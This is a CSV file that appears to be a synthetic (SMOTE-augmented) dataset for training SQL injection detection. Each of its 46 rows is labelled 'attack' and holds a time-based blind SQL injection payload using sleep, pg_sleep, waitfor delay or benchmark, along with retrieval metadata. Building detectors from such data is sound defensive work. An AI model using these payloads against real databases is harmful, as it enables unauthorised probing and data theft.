id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.45559527743169603
SMOTE_000002,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000089,1.2883807130134644
SMOTE_000003,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000155,0.5469767702776619
SMOTE_000004,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000234,0.49238620884554374
SMOTE_000005,attack,time,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000129,0.1377665287215984
SMOTE_000006,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000197,0.40787321861412124
SMOTE_000007,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.5449608308842481
SMOTE_000008,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000199,0.9783697244086067
SMOTE_000009,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000200,0.15528782241220496
SMOTE_000010,attack,time,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,nearest_attack_euclidean,R000138,1.392644232007927
SMOTE_000011,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000073,0.1487135917193426
SMOTE_000012,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000111,0.1074962197754313
SMOTE_000013,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000133,0.42690849262415925
SMOTE_000014,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000089,0.2843661769575524
SMOTE_000015,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,0.336361058572759
SMOTE_000016,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.042069208050483566
SMOTE_000017,attack,time,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',nearest_attack_euclidean,R000241,0.9208751532474015
SMOTE_000018,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000209,0.3600439013776865
SMOTE_000019,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",nearest_attack_euclidean,R000232,1.041259970543356
SMOTE_000020,attack,time,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',nearest_attack_euclidean,R000241,1.2763505500076462
SMOTE_000021,attack,time,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",nearest_attack_euclidean,R000290,0.9718129485491395
SMOTE_000022,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000010,0.7358345328505609
SMOTE_000023,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000143,0.5439041362979538
SMOTE_000024,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000308,0.5632055233624671
SMOTE_000025,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000264,0.17201824991387032
SMOTE_000026,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000018,1.2423318639779657
SMOTE_000027,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000240,1.829656394627261
SMOTE_000028,attack,time,"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000237,1.0174084684654934
SMOTE_000029,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000307,1.3899669710253097
SMOTE_000030,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000281,0.32334266421402724
SMOTE_000031,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000072,0.5070842476831282
SMOTE_000032,attack,time,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",nearest_attack_euclidean,R000124,1.4928279724825233
SMOTE_000033,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000259,0.09000060361314231
SMOTE_000034,attack,time,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000278,1.2017943608890234
SMOTE_000035,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,0.602830626984908
SMOTE_000036,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000078,0.12335337345379573
SMOTE_000037,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,nearest_attack_euclidean,R000128,0.12313586326693493
SMOTE_000038,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000291,0.5277819283740345
SMOTE_000039,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,0.4929178764231972
SMOTE_000040,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000162,0.4174603458312169
SMOTE_000041,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,1.4065831524006631
SMOTE_000042,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000155,0.6572411851650681
SMOTE_000043,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000087,0.5685957513876759
SMOTE_000044,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000113,0.5026161321416004
SMOTE_000045,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R000300,1.8708807963472849
SMOTE_000046,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000176,0.5336520900776359
